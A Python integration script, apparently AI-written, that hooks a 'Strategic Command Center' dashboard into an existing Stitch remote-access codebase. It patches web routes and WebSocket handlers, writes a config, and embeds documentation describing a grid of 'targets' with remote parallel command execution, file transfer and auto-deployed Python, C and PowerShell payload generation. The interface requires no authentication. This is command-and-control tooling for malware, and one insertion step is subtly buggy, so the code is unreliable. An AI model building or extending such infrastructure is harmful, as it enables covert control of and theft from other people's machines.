#!/usr/bin/env python3
"""
Strategic Command Center - Integration Script
Integrates the strategic center with existing Stitch infrastructure
"""

import os
import sys
import time
import json
import threading
from pathlib import Path

# Add workspace to path
sys.path.insert(0, '/workspace')

def integrate_with_existing_system():
    """Integrate strategic center with existing Stitch system"""
    print("🔗 Integrating Strategic Command Center with existing system...")
    
    # Import existing components
    try:
        from Application.stitch_cmd import get_stitch_server
        from Core.elite_executor import EliteCommandExecutor
        print("✅ Existing Stitch components available")
    except ImportError as e:
        print(f"⚠️ Some Stitch components not available: {e}")
    
    # Initialize strategic center
    try:
        from strategic_command_center import init_strategic_center
        strategic_center = init_strategic_center()
        print("✅ Strategic Command Center initialized")
    except Exception as e:
        print(f"❌ Failed to initialize Strategic Command Center: {e}")
        return False
    
    return True

def create_strategic_routes():
    """Create strategic routes in existing web app"""
    print("🛣️ Creating strategic routes...")
    
    # Read existing web_app_real.py
    web_app_path = '/workspace/web_app_real.py'
    if os.path.exists(web_app_path):
        with open(web_app_path, 'r') as f:
            content = f.read()
        
        # Add strategic route
        strategic_route = '''
# Strategic Command Center Route
@app.route('/strategic')
def strategic_command_center():
    """Strategic Command Center interface"""
    return render_template('strategic_command_center.html')
'''
        
        # Insert before the last line
        lines = content.split('\n')
        if 'if __name__ == "__main__":' in content:
            insert_index = content.find('if __name__ == "__main__":')
            lines.insert(insert_index, strategic_route)
        else:
            lines.append(strategic_route)
        
        # Write back
        with open(web_app_path, 'w') as f:
            f.write('\n'.join(lines))
        
        print("✅ Strategic route added to existing web app")
    else:
        print("⚠️ Existing web app not found, using standalone strategic app")

def update_existing_websocket():
    """Update existing WebSocket handlers"""
    print("🔌 Updating WebSocket handlers...")
    
    websocket_path = '/workspace/websocket_extensions.py'
    if os.path.exists(websocket_path):
        with open(websocket_path, 'r') as f:
            content = f.read()
        
        # Add strategic WebSocket integration
        strategic_websocket = '''
# Strategic Command Center WebSocket Integration
try:
    from strategic_websocket import register_strategic_websocket_events
    register_strategic_websocket_events(socketio, logger)
    logger.info("🎯 Strategic WebSocket events registered")
except ImportError:
    logger.warning("⚠️ Strategic WebSocket events not available")
'''
        
        # Insert before the last line
        if 'logger.info("Elite WebSocket events registered with advanced functionality")' in content:
            insert_point = content.find('logger.info("Elite WebSocket events registered with advanced functionality")')
            lines = content[:insert_point] + strategic_websocket + '\n\n' + content[insert_point:]
            
            with open(websocket_path, 'w') as f:
                f.write(lines)
            
            print("✅ Strategic WebSocket integration added")
        else:
            print("⚠️ Could not find insertion point for WebSocket integration")

def create_strategic_config():
    """Create strategic configuration"""
    print("⚙️ Creating strategic configuration...")
    
    config = {
        "strategic_center": {
            "redis_host": "localhost",
            "redis_port": 6379,
            "redis_db": 0,
            "update_interval": 5,
            "health_check_interval": 10,
            "max_targets": 50,
            "max_command_history": 1000,
            "max_file_operations": 500
        },
        "ui": {
            "target_grid_columns": 4,
            "target_grid_rows": 3,
            "right_panel_width": "20%",
            "central_panel_width": "80%",
            "theme": "strategic_dark",
            "font_family": "monospace"
        },
        "features": {
            "real_time_updates": True,
            "parallel_execution": True,
            "bulk_operations": True,
            "health_monitoring": True,
            "file_management": True,
            "payload_generation": True
        }
    }
    
    config_path = '/workspace/strategic_config.json'
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=2)
    
    print(f"✅ Strategic configuration created: {config_path}")

def create_strategic_documentation():
    """Create strategic documentation"""
    print("📚 Creating strategic documentation...")
    
    docs = """# Strategic Command Center - Documentation

## Core Principle
"Everything has a purpose, nothing is decorative"

## Architecture

### Central Target Grid (80% of screen)
- 4x3 grid of target cards
- Each target is a complete control unit
- One-click access to all functions
- Real-time status updates
- Health monitoring

### Right Panel (20% of screen)
- Context-sensitive content
- Target selected → Command terminal + file browser
- No target → Payload generator + system stats
- Command running → Real-time output + progress

### Real-Time Architecture
- Redis for data persistence
- WebSocket for live updates
- Async command execution
- Event-driven updates

## Features

### Target Management
- Real-time connection tracking
- Health monitoring (CPU, RAM, network)
- Bulk operations
- Smart grouping

### Command Execution
- Parallel execution across targets
- Command queuing
- Real-time streaming output
- Command templates

### File Management
- Real-time file sync
- Bulk file operations
- File preview
- Encrypted storage

### Payload Generation
- Python payloads
- Native C payloads
- PowerShell payloads
- Auto-deployment

## Usage

### Starting the System
```bash
python start_strategic_center.py
```

### Accessing the Interface
- URL: http://localhost:5000/strategic
- No authentication required (for now)

### Key Features
1. **Target Grid**: Click any target to select it
2. **Command Terminal**: Execute commands on selected target
3. **File Browser**: Upload/download files
4. **Bulk Operations**: Execute on multiple targets
5. **Real-time Updates**: Live status and health monitoring

## API Endpoints

- `GET /api/targets` - Get all targets
- `GET /api/targets/<id>` - Get specific target
- `POST /api/execute_command` - Execute command
- `POST /api/execute_parallel` - Execute on multiple targets
- `POST /api/upload_file` - Upload file
- `POST /api/download_file` - Download file
- `GET /api/system_stats` - Get system statistics

## WebSocket Events

- `targets_update` - Target status updates
- `command_result` - Command execution results
- `file_operation` - File operation updates
- `system_stats` - System statistics updates

## Configuration

Edit `strategic_config.json` to customize:
- Redis settings
- UI layout
- Feature toggles
- Update intervals

## Troubleshooting

### Redis Connection Issues
```bash
# Install Redis
sudo apt-get install redis-server  # Ubuntu/Debian
brew install redis                 # macOS

# Start Redis
redis-server
```

### Port Conflicts
```bash
# Kill existing servers
pkill -f strategic_web_app
pkill -f web_app_real
```

### Dependencies
```bash
pip install -r requirements.txt
```

## Design Philosophy

1. **No Bullshit**: Every element serves a purpose
2. **Strategic Layout**: Information density optimized
3. **Real-time**: Live updates for all operations
4. **Efficient**: One-click access to all functions
5. **Scalable**: Handles multiple targets simultaneously

## Future Enhancements

- Advanced analytics dashboard
- Custom command templates
- Target grouping and tagging
- Advanced file management
- Integration with external tools
- Mobile-responsive design
"""
    
    docs_path = '/workspace/STRATEGIC_COMMAND_CENTER.md'
    with open(docs_path, 'w') as f:
        f.write(docs)
    
    print(f"✅ Strategic documentation created: {docs_path}")

def main():
    """Main integration function"""
    print("🎯 Strategic Command Center - Integration")
    print("=" * 50)
    print("Integrating with existing Stitch infrastructure...")
    print("=" * 50)
    
    # Change to workspace directory
    os.chdir('/workspace')
    
    # Integration steps
    steps = [
        ("Integrating with existing system", integrate_with_existing_system),
        ("Creating strategic routes", create_strategic_routes),
        ("Updating WebSocket handlers", update_existing_websocket),
        ("Creating strategic configuration", create_strategic_config),
        ("Creating strategic documentation", create_strategic_documentation)
    ]
    
    for step_name, step_func in steps:
        print(f"\n🔄 {step_name}...")
        try:
            if step_func():
                print(f"✅ {step_name} completed")
            else:
                print(f"⚠️ {step_name} completed with warnings")
        except Exception as e:
            print(f"❌ {step_name} failed: {e}")
    
    print("\n🎯 Strategic Command Center Integration Complete!")
    print("=" * 50)
    print("Next steps:")
    print("1. Start Redis: redis-server")
    print("2. Start Strategic Center: python start_strategic_center.py")
    print("3. Access: http://localhost:5000/strategic")
    print("4. Or use existing app: http://localhost:5000/strategic")
    print("=" * 50)

if __name__ == '__main__':
    main()